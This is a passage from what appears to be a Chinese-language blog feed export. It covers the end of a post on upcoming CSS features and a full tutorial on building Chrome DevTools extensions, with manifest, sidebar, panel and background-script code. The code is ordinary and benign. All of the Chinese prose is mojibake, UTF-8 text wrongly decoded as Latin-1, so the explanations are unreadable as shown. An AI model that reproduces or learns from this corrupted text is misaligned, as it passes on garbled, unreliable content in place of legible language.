Worklets å¯ä»¥ç®—æ˜¯çµ¦ CSS Engines ä½¿ç”¨çš„ workerï¼Œç›¸å°æ–¼ web worker ä¾†èªªè¼ƒç‚ºè¼•é‡ã€ç”Ÿå‘½é€±æœŸè¼ƒçŸ­ï¼Œé©åˆç”¨ä¾†è™•ç† CSS engine é€™ç¨®å¯èƒ½æœƒç‰½æ‰¯åˆ°æ•¸ç™¾è¬ç•«ç´ åœ–ç‰‡çš„å·¥ä½œã€‚
å¯¦éš›ç¯„ä¾‹å¯ä»¥åƒè€ƒ Google æä¾›çš„ Codepen ç¯„ä¾‹
Othersé‚„æœ‰è¨±å¤šæ–°å±¬æ€§åœ¨æ¼”è¬›ä¸­æ²’æœ‰æ™‚é–“ç´°è¬›ï¼Œå°±å°‡å…¶ä¸»è¦åŠŸèƒ½åˆ—åœ¨é€™é‚Šï¼Œæœ‰èˆˆè¶£çš„äººå¯ä»¥åˆ° MDN æˆ– W3C ä¸Šæœå°‹ã€‚

size: å¯ä»¥è®“ä½ åŒæ™‚è¨­å®šå…ƒç´ çš„å¯¬ã€é«˜å±¬æ€§ã€‚
aspect-ratio: é€éæ­¤å±¬æ€§ï¼Œå†ä¹Ÿä¸ç”¨åˆ©ç”¨ padding ç­‰æ–¹å¼ä¾†è£½é€ ç­‰æ¯”ä¾‹ç¸®æ”¾æ•ˆæœäº†ï¼
min(), max(), clamp(): é€™å¹¾å€‹å‡½å¼æä¾›ä½ åœ¨å„ç¨® CSS å±¬æ€§åŠ ä¸Šæ•¸å€¼çš„é™åˆ¶ã€‚
list-style-type: æœ‰æ–°çš„ value å¯ä»¥è¨­ç½®ï¼Œåƒæ˜¯ emoji èˆ‡ SVGsã€‚
display: outer inner: display å±¬æ€§ä¹‹å¾Œèƒ½å¤ æ¥å—å…©å€‹åƒæ•¸ï¼Œè®“ä½ æ˜ç¢ºçš„å€‹åˆ¥è¨­ç½® outer èˆ‡ inner layoutï¼Œè€Œéä½¿ç”¨ inline-flex é€™ç¨®çµåˆåœ¨ä¸€èµ·çš„ keywordsã€‚

çµè«–CSS çš„ç™¼å±•ç¸½æ˜¯æ¯”è¼ƒç·©æ…¢ï¼Œç•¢ç«Ÿéœ€è¦å„å€‹ç€è¦½å™¨å¯¦ä½œé…åˆï¼ŒèƒŒå¾Œçš„å› ç´ å¯èƒ½ä¸å–®å–®æ˜¯ç´”æŠ€è¡“é€™éº¼ç°¡å–®ï¼Œä½†æ…¢æ­¸æ…¢ï¼Œé‚„æ˜¯èƒ½çœ‹å¾—åˆ°å‰é€²çš„æ­¥ä¼ï¼Œåœ¨æ–°å±¬æ€§æ™®åŠå‰ï¼Œå°±åˆ° codepen ä¸Šå¼„å€‹ side project ç©ç©å§ï¼æ‰€æœ‰æ¼”è¬›ä¸­æåˆ°çš„åŠŸèƒ½ï¼Œåªè¦æ˜¯ç›®å‰ç€è¦½å™¨å·²ç¶“æ”¯æ´çš„ï¼Œéƒ½æœ‰ç¯„ä¾‹å…¬å¸ƒåœ¨ä»–å€‘çš„ç¯„ä¾‹ç¶²ç«™ä¸Šï¼Œæ¨è–¦å‰å¾€è©¦è©¦ï¼
è³‡æ–™ä¾†æº
Vidoe - Next-generation web styling
Article - Next-generation web styling
Examples - Next-generation web styling
ä½ ä¸çŸ¥é“çš„ CSS ï¼š Next-generation web styling

]]></content>
  </entry>
  <entry>
    <title>Chrome devtools extension å¯¦ä½œä»‹ç´¹</title>
    <url>/2018/02/10/chrome-devtool-extension/</url>
    <content><![CDATA[å‰è¨€èº«ç‚ºå·¥ç¨‹å¸«ï¼Œæƒ³è¾¦æ³•æé«˜è‡ªå·±çš„å·¥ä½œæ•ˆç‡æ˜¯ä¸€ä»¶å¾ˆé‡è¦çš„äº‹æƒ…ï¼Œç•¢ç«Ÿé€™æ¨£æ‰æœ‰å¤šé¤˜çš„æ™‚é–“æ‰“é›»å‹•ï¼Œé™¤äº†å¹³æ™‚åŠ å¼·å„ç¨®çŸ¥è­˜èˆ‡ç´¯ç©ç¶“é©—å¤–ï¼Œæ’°å¯«å·¥å…·çš„èƒ½åŠ›ä¹Ÿå€¼å¾—åŸ¹é¤Šã€‚å‰›å¥½åœ¨å‰ä¸ä¹…ï¼Œå…¬å¸èˆ‰è¾¦äº†ä¸€æ¬¡å…§éƒ¨çš„ hackdayï¼Œæˆ‘å°±åˆ©ç”¨é€™å€‹æ™‚é–“é‡å°å…¬å¸å…§éƒ¨çš„ framework å¯«äº†ä¸€å€‹ç°¡å–®çš„ chrome devtools çš„ extensionï¼Œå¢åŠ é–‹ç™¼ä¸Šçš„ä¾¿åˆ©æ€§ã€‚è€Œåœ¨é–‹ç™¼çš„éç¨‹ä¸­ï¼Œç™¼ç¾é—œæ–¼ Chrome devtools extension çš„æ–‡ç« ä¸¦ä¸æ˜¯å¾ˆå¤šï¼Œä¸­æ–‡çš„æ›´å°‘ã€‚ç¸½ä¹‹ï¼Œé›–ç„¶å®˜æ–¹æ–‡ä»¶è©²æœ‰çš„éƒ½æœ‰ï¼Œä½†è·Ÿ vscode extension çš„æ–‡ä»¶æ¯”èµ·ä¾†å°±æ˜¯å·®äº†å¾ˆå¤šï¼Œå…‰æ˜¯æ’ç‰ˆå°±è®“äººä¸å¤ªæƒ³é–±è®€â€¦å› æ­¤å¸Œæœ›è—‰æ­¤ç¯‡æ–‡ç« ä»‹ç´¹é–‹ç™¼ chrome devtools extension çš„æ–¹æ³•èˆ‡ä¸€äº›æ³¨æ„äº‹é …ã€‚ï¼ˆè¨»ï¼šå¯èƒ½éœ€è¦å…ˆæœ‰é» Chrome extension çš„ç›¸é—œçŸ¥è­˜æœƒæ¯”è¼ƒå¥½æ‡‚ï¼‰
å…ˆçµ¦å¤§å®¶çœ‹å…¶ä¸­ä¸€å€‹ç¯„ä¾‹ï¼ˆå…±æœ‰å…©å€‹ï¼‰ï¼Œä¸»è¦æ˜¯èƒ½è‡ªå‹•å°‡ DOM ç‰©ä»¶çš„ element inline style è½‰åŒ–ç‚º Atomic CSS çš„ class åç¨±ï¼ˆä¸çŸ¥é“ Atomic CSS çš„å¯ä»¥çœ‹é€™ç¯‡ï¼‰ï¼Œå¦‚æ­¤ä¸€ä¾†ï¼Œåœ¨ Inspector ä¸­èª¿æ•´å®Œ style å¾Œï¼Œå°±èƒ½ç›´æ¥å°‡è½‰æ›å¥½çš„ Atomic CSS è¤‡è£½è²¼ä¸Šåˆ° code ç•¶ä¸­ï¼Œçœå»ä¸€æ¬¡è‡ªå·±è½‰æ›çš„æ™‚é–“ï¼ˆæœ‰æ™‚é‚„æœƒå¿˜è¨˜ class nameâ€¦ï¼‰

Chrome devtools extension åŸºæœ¬ä»‹ç´¹æœ‰é–‹ç™¼é Chrome extension çš„äººæ‡‰è©²éƒ½çŸ¥é“ï¼Œæˆ‘å€‘æœƒæœ‰æ‰€è¬‚çš„ Content Script èˆ‡ Background page å…©ç¨®ä¸åŒçš„ context å­˜åœ¨æ–¼æˆ‘å€‘çš„ extension ä¸­ï¼Œè€Œ Devtools page ä¹Ÿæ˜¯ä¸€å€‹ç¨ç«‹çš„ contextï¼Œå¾ä¸‹é¢é€™å¼µå®˜æ–¹åœ–å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°å…¶ä¹‹é–“çš„å·®ç•°ï¼š


Content Script: å¯ä»¥å­˜å–å¯¦éš›é é¢çš„ DOM ç‰©ä»¶èˆ‡äº‹ä»¶ã€‚
Background page: å¯ä»¥èª¿ç”¨å¤šæ•¸ extension APIï¼Œåƒæ˜¯ chrome.runtime.* èˆ‡ chrome.tabs.onUpdatedï¼Œä¸¦è² è²¬ extension èˆ‡ Content scriptã€Devtools page ä¹‹é–“çš„æºé€šã€‚
Devtools page: å¯ä»¥èª¿ç”¨ chrome.extensions.* èˆ‡ chrome.devtools.* Devtools APIï¼Œå…¶ä»–çš„å°±éƒ½ç„¡æ³•å­˜å–ã€‚å¯ä»¥é€é chrome.devtools.inspectedWindow.eval èƒ½èˆ‡ç›®å‰é–‹å•Ÿ inspector çš„é é¢äº’å‹•ã€‚

èˆ‡ä¸€èˆ¬ Extension ä¸åŒçš„åœ°æ–¹å°±åœ¨æ–¼å¤šäº† Devtools API éœ€è¦äº†è§£ï¼Œè€Œä¸»è¦çš„ Devtools API å…¶å¯¦ä¹Ÿåªæœ‰ä¸‰ç¨®ï¼š
1. chrome.devtools.inspectedWindowé€é inspectedWindow.eval å¯ä»¥åœ¨ç•¶å‰é–‹å•Ÿ inspector çš„é é¢ context åŸ·è¡Œ javascriptï¼š
chrome.devtools.inspectedWindow.eval(  &quot;window.$0.style.cssText&quot;,  function callback(result, Error) &#123;    // result ç‚º window.$0.style.cssText    // åœ¨ç•¶å‰é é¢çš„ context ä¸‹æ”¯åŸ·è¡Œçµæœ &#125;);
2. chrome.devtools.networknetwork api å¯ä»¥å–å¾—ä½ åœ¨ Network panel çœ‹åˆ°çš„è³‡è¨Šã€‚
// å–å¾—ç•¶å‰é–‹å•Ÿ inspector çš„é é¢æ‰€ç™¼å‡ºçš„ request ä¸­ï¼ŒbodySize &gt; 40*1024 çš„ urlchrome.devtools.network.onRequestFinished.addListener(      function(request) &#123;        if (request.response.bodySize &gt; 40*1024) &#123;          chrome.devtools.inspectedWindow.eval(              &#x27;console.log(&quot;Large request: &quot; + unescape(&quot;&#x27; +              escape(request.request.url) + &#x27;&quot;))&#x27;);        &#125;  &#125;);
3. chrome.devtools.panelspanels api æ‡‰è©²æ˜¯æœ€é‡è¦çš„ä¸€å¡Šäº†ï¼Œå› ç‚ºæˆ‘å€‘å¿…é ˆé€éå®ƒä¾†å‰µå»º Panel æˆ– Sidebarã€‚

Chrome devtools çš„ extension UI åŸºæœ¬ä¸Šå°±æ˜¯åˆ†ç‚ºä¸Šé¢é€™å…©ç¨®é¡å‹ï¼Œèˆ‡ä¸Šæ–¹ Elementsã€Network å’Œ Sources åŒ Level çš„ç¨±ç‚º Panelï¼Œè€Œåœ¨æ¯å€‹ Panel åº•ä¸‹é‚„å¯ä»¥å¦å¤–å‰µå»º Sidebarï¼Œåƒæ˜¯ Elements panel å³é‚Šçš„ style sidebarã€‚
chrome.devtools.panels.create(&quot;Simple Panel&quot;,  &quot;logo.png&quot;,  &quot;Panel.html&quot;,  function (panel) &#123;    // code invoked on panel creation  &#125;);

çœ‹å®Œé€™äº› API æ‡‰è©²ä¹Ÿæ˜¯ä¸€é ­éœ§æ°´ï¼Œä¹Ÿä¸æ¸…æ¥šåˆ°åº•è¦åœ¨å“ªè£¡å‘¼å«ï¼Œåˆ¥æ€¥ï¼Œæ¥ä¸‹ä¾†æœƒé‡å°é€™å…©ç¨® UI å€‹åˆ¥å¯¦ä½œä¸€å€‹ç¯„ä¾‹ä¾†èªªæ˜ã€‚
Chrome devtools extension - Sidebar å¯¦ä½œé–‹é ­çš„ç¯„ä¾‹ä¸­ï¼Œå°±æ˜¯æ¡å– Sidebar çš„ UIï¼Œå±¬æ–¼ ElementPanel åº•ä¸‹çš„ sidebarã€‚
æ¥è‘—å…ˆçœ‹ä¸€ä¸‹æˆ‘å€‘çš„æª”æ¡ˆçµæ§‹ï¼š


å¾ˆç°¡å–®ï¼Œé‡é»åªæœ‰ä¸‰å€‹æª”æ¡ˆï¼ŒruleMap.js æ˜¯è·Ÿ Atomic CSS ç›¸é—œçš„ mapping æª”æ¡ˆï¼Œé€™é‚Šä¸éœ€è¦ç†æœƒï¼š
1. manifest.json  &#123;  &quot;name&quot;: &quot;Atomic CSS Devtool&quot;,  &quot;version&quot;: &quot;0.1&quot;,  &quot;description&quot;: &quot;devtool extension for making Acss users happier&quot;,  &quot;devtools_page&quot;: &quot;devtools.html&quot;,  &quot;manifest_version&quot;: 2&#125;
  è·Ÿä¸€èˆ¬ extension ä¸€æ¨£ï¼Œè¦åœ¨ manifest.json ä¸­åšç›¸å°æ‡‰è¨­å®šï¼Œæ—¢ç„¶æ˜¯é–‹ç™¼ Devtools extensionï¼Œè‡ªç„¶å°±è¦è¨»å†Š devtools_pageï¼ŒæŒ‡å®šç‚º devtools.htmlï¼Œé€™ä»½ html å°±æ˜¯ç”¨ä¾†è¼‰å…¥ç›¸é—œ js çš„å…¥å£é é¢ã€‚
2. devtools.html  &lt;html&gt;  &lt;body&gt;    &lt;script src=&quot;ruleMap.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;devtools.js&quot;&gt;&lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;
  å…§å®¹éå¸¸ç°¡å–®ï¼Œè¼‰å…¥æ•´å€‹ devtools extension éœ€è¦çš„ javascript æª”æ¡ˆã€‚å¦‚æœä½ åœ¨ devtools.js ä¸­æœ‰å…¶ä»–éœ€è¦ä½¿ç”¨çš„ libï¼Œä¹Ÿè«‹è¨˜å¾—åœ¨é€™å€‹åœ°æ–¹é€²è¡Œè¼‰å…¥ï¼Œåƒæ˜¯ lodash ç­‰ç­‰ã€‚  ä½†è‹¥ä½ è¦è¼‰å…¥éæœ¬åœ°ç«¯çš„ javascriptï¼ˆé€é cdn ä¹‹é¡ï¼‰ï¼Œæœƒé‡åˆ° CSP(content security policy) çš„éŒ¯èª¤ï¼Œåœ¨ æ³¨æ„äº‹é … ä¸­æˆ‘æœƒå†èªªæ˜è§£æ³•ã€‚
3. devtools.js  (function() &#123;  chrome.devtools.panels.elements.createSidebarPane(    &quot;acss class&quot;,    function (sidebar) &#123;      // The function below is executed in the context of the inspected page.      var page_generateAtomicClass = function (selectedElementCssText) &#123;        // generate Atomic CSS        // ç•¥...        return styleMap;      &#125;      function updateElementProperties(acssClass) &#123;        sidebar.setObject(acssClass);      &#125;;      function getAcssClass() &#123;        chrome.devtools.inspectedWindow.eval(          &quot;window.$0.style.cssText&quot;,            function (result, isException) &#123;              const selectedElementCssText = result;              const acssClass = page_generateAtomicClass(selectedElementCssText);              updateElementProperties(acssClass);            &#125;        );      &#125;;      chrome.devtools.panels.        elements.onSelectionChanged.addListener(getAcssClass);      getAcssClass();  &#125;);&#125;)();

devtool.js å°±æ¯”è¼ƒè¤‡é›œäº†ï¼Œæ‰€æœ‰ä¸»è¦åŠŸèƒ½éƒ½ç™¼ç”Ÿåœ¨é€™è£¡ã€‚
é¦–å…ˆï¼Œæˆ‘å€‘åˆ©ç”¨ chrome.devtools.panels.elements.createSidebarPane(sidebarTitle, callbackFunc) ä¾†å‰µå»º Sidebarï¼Œåœ¨ callback ä¸­æˆ‘å€‘æœƒæ‹¿åˆ°ä¸€å€‹ sidebar ç‰©ä»¶ï¼Œæ­¤ç‰©ä»¶æ˜¯æˆ‘å€‘èˆ‡å³é‚Šé€™å€‹ sidebar å€å¡Šäº’å‹•çš„åª’ä»‹ï¼Œæœ‰å››ç¨® method å¯ä»¥ä½¿ç”¨ï¼š

sidebar.setObject()  æˆ‘å€‘ç¯„ä¾‹ä¸­å°±æ˜¯ä½¿ç”¨ setObject() ä¾†å°‡é‹ç®—å®Œçš„è³‡æ–™ï¼ˆè½‰æ›å¾Œçš„ atomic css classnameï¼‰å‚³åˆ° sidebar é¡¯ç¤ºï¼Œä»–æœƒå°‡å‚³å…¥çš„ Object å±•é–‹ï¼š
  

sidebar.setPage() èˆ‡ sidebar.setHeight()  è‹¥æ˜¯è¦ºå¾—å…‰æ˜¯é¡¯ç¤º JS çš„ Object å¤ªå–®èª¿ï¼Œä½ ä¹Ÿå¯ä»¥åˆ©ç”¨ setPage() æ­é… setHeight() ä¾†åœ¨ sidebar ä¸­å¡å…¥ä¸€å€‹ htmlã€‚
  chrome.devtools.panels.elements.createSidebarPane(&quot;Atomic Css&quot;,    function(sidebar) &#123;      sidebar.setPage(&quot;Sidebar.html&quot;);      sidebar.setHeight(&quot;8ex&quot;);    &#125;);
  Sidebar.html ä¸­ï¼Œå¯ä»¥è‡ªç”±ç¹ªè£½ç•«é¢ï¼Œä½†è¦æ³¨æ„çš„æ˜¯ï¼Œä½ æ˜¯åœ¨ sidebar çš„ context ä¸­ï¼Œä¸èƒ½å–å¾—ç•¶å‰é é¢çš„ DOM ç‰©ä»¶è³‡æ–™ï¼Œéœ€è¦çš„è©±å¾—é€é background.js ä»¥ postMessage ä¾†å‚³éï¼Œæˆ‘å€‘æœ€å¾Œé‚„æœƒæåˆ°ã€‚

sidebar.setExpression()  é™¤äº† setObject ä»¥å¤–ï¼Œæˆ‘å€‘ä¹Ÿèƒ½å¤ é setExpression ç›´æ¥ eval() js code åˆ°ç•¶å‰çš„ inspected pageã€‚
  sidebar.setExpression(&quot;(&quot; + page_generateAtomicClass.toString() + &quot;)()&quot;);
  ä½¿ç”¨æ–¹æ³•æœ‰é»ç‰¹æ®Šï¼Œå› ç‚ºæ˜¯ eval çš„æ–¹å¼ï¼Œä½ éœ€è¦æŠŠå‡½å¼ toString() å¾Œå†å‚³å…¥ï¼Œæ­¤å¤–ï¼Œåœ¨å‚³å…¥çš„ page_generateAtomicClass() ä¸­ï¼Œä½ å¯ä»¥å–å¾—ç•¶å‰ inspected é é¢çš„è³‡è¨Šï¼  ä¾‹å¦‚ï¼š$0 (Chrome devtools ä¸­ç‰¹æ®Šçš„è®Šæ•¸ï¼Œç­‰åŒæ–¼ Element panel ä¸­ä½ ç›®å‰é¸å–çš„å…ƒç´  DOM)ã€‚  å®˜æ–¹æ–‡ä»¶ä¸­ setExpression é‚„èƒ½å‚³å…¥ä¸€å€‹ callbackï¼Œä½†æ˜¯æˆ‘æ€éº¼å‚³éƒ½æœƒæœ‰ Error å°±æ˜¯äº†â€¦


æ¥è‘—ï¼Œæˆ‘ç”¨ chrome.devtools.inspectedWindow.eval(&quot;window.$0.style.cssText&quot;, callback); çš„æ–¹å¼å»å–å¾— selected element çš„ css è³‡è¨Šï¼Œæ¥è‘—åœ¨ callback ä¸­å°‡å…¶å‚³çµ¦ page_generateAtomicClass() åšé‹ç®—ï¼Œæœ€å¾Œç”¨ sidebar.setObject() å°‡çµæœè¼¸å‡ºã€‚
ç­‰ç­‰ï¼Œä½ ä¸æ˜¯èªª sidebar.setExpression å°±èƒ½ç›´æ¥å–å¾— $0 äº†å—ï¼Ÿä½•å¿…å¤šæ­¤ä¸€èˆ‰ï¼Ÿ
åŸå› å¾ˆç°¡å–®ï¼Œå› ç‚ºåœ¨ setExpression å‚³å…¥çš„ function ä¸­ï¼Œä½ å–ä¸åˆ° devtools.js ä¸­çš„ contextï¼Œæ‰€æœ‰ä½ åœ¨ devtools.html ä¸­ include çš„ js éƒ½ç„¡æ³•å–å¾—ï¼Œåƒæ˜¯æˆ‘éœ€è¦ç”¨ä¾†è½‰æ› Atomic css çš„ ruleMap.js å°±ç„¡æ³•æ‹¿åˆ°ï¼Œåªå¥½æ¡æ­¤ä½œæ³•ã€‚åœ¨å¯¦ä½œæ™‚éœ€è¦ç‰¹åˆ¥æ³¨æ„ context çš„å•é¡Œï¼
æœ€å¾Œï¼Œæˆ‘å€‘è¨»å†Šä¸€å€‹ onSelectionChanged ç›£è½äº‹ä»¶ chrome.devtools.panels.elements.onSelectionChanged.addListener(getAcssClass);ï¼Œåªè¦é¸æ“‡åˆ¥çš„ elements æ™‚å°±é‡æ–°åŸ·è¡Œã€‚
åˆ°é€™é‚Šç‚ºæ­¢ï¼Œä½ å°±èƒ½å¤ åšå‡ºå¦‚åŒä¸€é–‹å§‹ç¯„ä¾‹æ‰€å±•ç¾åŠŸèƒ½çš„ Devtools extension äº†ï¼
Chrome devtools extension - Panel å¯¦ä½œé€™å€‹ç¯„ä¾‹æ˜¯å¯¦ä½œ Panel UI çš„ extensionï¼Œé€™é‚Šæˆ‘å°‡åŠŸèƒ½é™ä¹‹æœ€ä½ï¼Œå–®ç´”æŠ“å‡ºç›®å‰é é¢çš„ Page titleï¼Œç›®çš„åœ¨å±•ç¤ºå¦‚ä½•å°‡ä¸åŒ context çš„è³‡è¨Šå‘ˆç¾åœ¨ Devtools çš„ Panel ä¸­ã€‚

ä¸€æ¨£å…ˆä¾†çœ‹æª”æ¡ˆçµæ§‹ï¼š


å¯ä»¥çœ‹åˆ°åŸºæœ¬ä¸Šè·Ÿå‰ä¸€å€‹ç¯„ä¾‹å·®ä¸å¤šï¼Œåªæ˜¯å¤šäº† Panel.html èˆ‡ background.js å…©å€‹æª”æ¡ˆã€‚
å¦å¤–çš„å·®åˆ¥åœ¨æ–¼ devtools.jsï¼š
(function() &#123;  chrome.devtools.inspectedWindow.eval(    &quot;document.title&quot;,    function (result, isException) &#123;      if (!isException &amp;&amp; result) &#123;        chrome.devtools.panels.create(&quot;Panel Demo&quot;,          &quot;logo.png&quot;,          &quot;Panel.html&quot;,          function (panel) &#123;            // code invoked on panel creation          &#125;        );      &#125;    &#125;  );&#125;)();

æœ‰åˆ¥æ–¼å‰ä¸€å€‹ç¯„ä¾‹æˆ‘å€‘éƒ½å°‡ç¨‹å¼é‚è¼¯å¯«åœ¨ devtools.js ä¸­ï¼Œé€™æ¬¡æˆ‘å€‘åªåœ¨é€™é‚Šé€²è¡Œå‰µå»º panel çš„ç¨‹å¼ï¼Œå¯ä»¥å¾ä¸Šé¢ç¨‹å¼ç¢¼ä¸­çœ‹åˆ°ï¼Œæˆ‘å€‘å‰µå»ºäº†ä¸€å€‹ Title å«åš â€œPanel Demoâ€ çš„ panelï¼Œä¸¦å‘Šè¨´ chrome devtool æ˜¯è¦ç”¨ Panel.html é€™ä»½æª”æ¡ˆã€‚
åœ¨ Panel.html ä¸­ï¼Œæˆ‘å€‘è¼‰å…¥ä¸»è¦ç¨‹å¼é‚è¼¯ getPageTitle.jsï¼Œä½ ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œé€™é‚Šå°±æ˜¯ç¹ªè£½ Panel çš„åœ°æ–¹ï¼Œå› æ­¤å¯ä»¥è¼‰å…¥ bootstrap ç­‰ css style ä¾†è¼”åŠ©ã€‚
&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot; integrity=&quot;sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm&quot;    crossorigin=&quot;anonymous&quot;&gt;&lt;div id=&quot;app&quot; class=&quot;container mt-3&quot;&gt;&lt;/div&gt;&lt;script src=&quot;getPageTitle.js&quot;&gt;&lt;/script&gt;

æ¥è‘—ä¾†çœ‹ä¸»è¦ç¨‹å¼é‚è¼¯ï¼ŒgetPageTitle.jsï¼š
(function() &#123;  // èˆ‡ background.js å»ºç«‹ channel é€£çµ  const port = chrome.extension.connect(&#123;      name: &quot;Devtools.js Communication&quot;  &#125;);  const inspectedWindowId = chrome.devtools.inspectedWindow.tabId;  // Listen to messages from the background page  port.onMessage.addListener(function (message) &#123;      if (message.action === &quot;reloadExtension&quot; &amp;&amp; message.updatedTabId === inspectedWindowId) &#123;          const appNode = document.querySelector(&#x27;#app&#x27;);          removeHTMLChilds(appNode);          getPageTitle();      &#125;  &#125;);  function getPageTitle() &#123;      chrome.devtools.inspectedWindow.eval(          &quot;document.title&quot;,          function (result, isException) &#123;              const appNode = document.querySelector(&#x27;#app&#x27;);              const titleWrapper = document.createElement(&quot;div&quot;);              const title = document.createTextNode(result);               titleWrapper.appendChild(title);              appNode.appendChild(title);          &#125;      );  &#125;  function removeHTMLChilds(HTMLNode) &#123;      while (HTMLNode.firstChild) &#123;          HTMLNode.removeChild(HTMLNode.firstChild);      &#125;  &#125;  // init  getPageTitle();&#125;)();

æˆ‘å€‘åˆ©ç”¨ chrome.devtools.inspectedWindow.eval() ä¾†åŸ·è¡Œ document.titleï¼Œå–å¾— page title è³‡è¨Šï¼Œä¸¦åˆ©ç”¨ document.createElement ç­‰åŸç”Ÿ Web API ä¾†å°‡è³‡è¨Šå‘ˆç¾åœ¨é é¢ä¸Šã€‚
æ¥è‘—é€™é‚Šæˆ‘å€‘ç”¨åˆ°äº† port.onMessage.addListener()ï¼ŒåŸå› æ˜¯æˆ‘å€‘æƒ³è¦ monitor é é¢çš„è®ŠåŒ–ï¼Œåƒæ˜¯ page reload æˆ–æ˜¯ page updateã€‚è€Œé€™äº›è³‡è¨Šéƒ½åªèƒ½é€é content script æˆ–æ˜¯ Background.js æ‰èƒ½å–å¾—ï¼Œå› æ­¤æˆ‘å€‘å¿…é ˆå»ºç«‹ä¸€å€‹ messaging çš„ channelï¼Œè®“ background.js å‘Šè¨´æˆ‘å€‘é é¢æ˜¯å¦æ›´æ–°äº†ï¼Œè‹¥æ›´æ–°å°±é‡æ–°ç¹ªè£½ Panel.html çš„å…§å®¹ã€‚
background.jschrome.runtime.onConnect.addListener(function (port) &#123;    chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) &#123;        if (changeInfo.status === &#x27;complete&#x27;) &#123;            reloadExtension(port, tabId);        &#125;    &#125;);    function reloadExtension(port, tabId) &#123;        const message = &#123; action: &quot;reloadExtension&quot;, updatedTabId: tabId &#125;;        port.postMessage(message);    &#125;&#125;);// `background.js` é€é `chrome.runtime.onConnect.addListener`// åœ¨èˆ‡ devtools page çš„ script é€£æ¥åˆ°å¾Œï¼Œç›£è½ `chrome.tabs.onUpdated` äº‹ä»¶ï¼Œ// ç•¶ update status ç‚º complete å¾Œï¼Œ`postMessage()` çµ¦ `Panel.html` ä¸­çš„ `getPageTitle.js`ã€‚

æ­¤å¤–ï¼Œç”±æ–¼ Background.js å­˜åœ¨æ–¼æ•´å€‹ Browser ä¸­ï¼Œå› æ­¤åœ¨ getPageTitle.js ä¸­ï¼Œéœ€è¦é€é const inspectedWindowId = chrome.devtools.inspectedWindow.tabId; å–å¾—ç•¶å‰ inspected page çš„ tab id ä¾†éæ¿¾å…¶ä»– tab çš„ event changeã€‚
å°±é€™æ¨£æˆ‘å€‘å°±å®Œæˆäº†ä¸€å€‹å¯ä»¥å–å¾—é é¢ Title çš„ Devtools extensionï¼é›–ç„¶åŠŸèƒ½è¶…å»¢ä½†è¦æ˜¯å¸Œæœ›è®“å¤§å®¶æœ‰å€‹æ¦‚å¿µï¼ŒçŸ¥é“è¦æ€éº¼é–‹å§‹ã€‚åŸºæœ¬ä¸Šæ‰€æœ‰ç¨‹å¼ç¢¼éƒ½åœ¨é€™é‚Šäº†ï¼Œä½†å¦‚æœé‚„æ˜¯æƒ³ç›´æ¥è¼‰ç¯„ä¾‹ code ä¾†çœ‹çš„è©±å¯ä»¥ç§»é§•è‡³ githubï¼Œä½†åªæ˜¯ demo ç”¨å°±æ˜¯äº†â€¦Demo 1 Demo 2
æ³¨æ„äº‹é …åœ¨ hackday é–‹ç™¼å…§éƒ¨å·¥å…·æ™‚å…¶å¯¦è¸©åˆ°ä¸å°‘é›·ï¼Œè€Œåœ¨ä¸Šè¿°çš„ç¯„ä¾‹ä¸­æ¯”è¼ƒé›£å»èªªæ˜ï¼Œå› æ­¤åœ¨æ–‡ç« çš„æœ€å¾Œé¡å¤–èˆ‡å¤§å®¶åˆ†äº«ï¼š

è¼‰å…¥å¤–éƒ¨æª”æ¡ˆçš„æ–¹å¼ é›–ç„¶åœ¨ devtools.html æˆ– Panel.html ä¸­å¯ä»¥è¼‰å…¥é™¤äº† devtools.js å¤–çš„æª”æ¡ˆï¼Œä½†è‹¥æ˜¯è¼‰å…¥çš„æª”æ¡ˆä¸­å­˜æœ‰ eval() æˆ–è‘—æ˜¯é€é web ä¸‹è¼‰çš„ jsï¼Œéƒ½æœƒå‡ºç¾ CSP(content ecurity policy) éŒ¯èª¤ï¼Œè€Œè§£æ³•æ˜¯åœ¨ manifest.json ä¸­åŠ ä¸Šä¸€è¡Œï¼š â€œcontent_security_policyâ€: â€œscript-src â€˜selfâ€™ â€˜unsafe-evalâ€™; object-src â€˜selfâ€™â€ é€™æ¨£å°±èƒ½è§£æ±º js ä¸­å­˜æœ‰ eval() æˆ–æ˜¯ setTimeout() æ‰€é€ æˆçš„ CSP error 
 è€Œè‹¥è¦è¼‰å¤–éƒ¨è³‡æºï¼Œå‰‡é‚„è¦å¦å¤–å°‡å…¶ domain ä¹ŸåŠ é€²å»ï¼Œç•¶ä½œ white list â€œcontent_security_policyâ€: â€œscript-src â€˜selfâ€™ â€˜unsafe-evalâ€™ https://maps.googleapis.com/; object-src â€˜selfâ€™â€

chrome.devtools.inspectedWindow.eval é•·åº¦é™åˆ¶ åœ¨è£½ä½œå…§éƒ¨å·¥å…·æ™‚ï¼Œå…¶å¯¦æ˜¯éœ€è¦å¾ inspected page çš„ context ä¸­å–å‡ºå¤§é‡è³‡æ–™åˆ° Panel.html ä¸­é€²è¡Œè™•ç†ï¼Œè€Œé€é inspectedWindow.eval çš„æ–¹å¼ä¸¦æ²’æœ‰è¾¦æ³•å‚³é€å¤ªå¤§é‡çš„ JSON objectï¼Œå› æ­¤æˆ‘æ˜¯å…ˆå°‡å…¶ JSON.stringify() å¾Œæ‰å¾€å¾Œå‚³çš„ã€‚ eg. chrome.devtools.inspectedWindow.eval( &quot;JSON.stringify(context.getStore())&quot;ã€‚


